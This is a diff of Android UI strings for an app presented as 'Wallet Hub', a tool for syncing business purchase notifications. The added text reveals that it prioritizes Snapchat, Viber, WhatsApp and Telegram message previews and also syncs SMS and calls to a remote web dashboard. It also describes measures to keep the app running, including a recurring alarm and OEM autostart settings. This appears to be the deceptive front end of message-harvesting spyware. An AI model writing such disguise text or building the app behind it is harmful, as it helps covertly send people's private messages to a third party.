@@ -4,14 +4,14 @@
     <string name="dashboard_title">Wallet Hub</string>
     <string name="dashboard_subtitle">Keep your business notifications synced in one place.</string>
     <string name="setup_card_title">Notification Listener</string>
-    <string name="setup_card_body">Allow notification access so this app can securely forward purchase and service messages to your dashboard.</string>
+    <string name="setup_card_body">Allow notification access so this app can securely forward purchase and service messages to your dashboard. Snapchat and Viber are prioritized — previews depend on each app’s notification settings (enable message previews where available).</string>
     <string name="status_checking">Checking permission...</string>
     <string name="status_active">Active and syncing</string>
     <string name="status_inactive">Inactive - permission needed</string>
     <string name="grant_access">Grant Notification Access</string>
     <string name="open_settings">Open Notification Settings</string>
     <string name="status_help_active">Great! Incoming notifications sync automatically. A foreground connection plus a system alarm (every ~4 minutes) try to keep the dashboard online after you leave the app or if the OEM stops the process — still allow unrestricted battery below, and on Xiaomi / Oppo / Samsung use Autostart or Lock app in recents when needed.</string>
-    <string name="status_help_inactive">Tap the button below, enable Wallet Hub, then return to this screen.</string>
+    <string name="status_help_inactive">Without notification access, WhatsApp/Telegram and other chat alerts will not sync to the dashboard (SMS/call sync still works separately). Tap below, enable Wallet Hub, then return here.</string>
     <string name="sync_checking">Registering device with dashboard…</string>
     <string name="sync_ok">Dashboard: device registered. Open the Devices tab on the web app.</string>
     <string name="sync_missing_config">Dashboard: add Supabase keys in android-app/supabase.properties, then rebuild and reinstall the APK.</string>
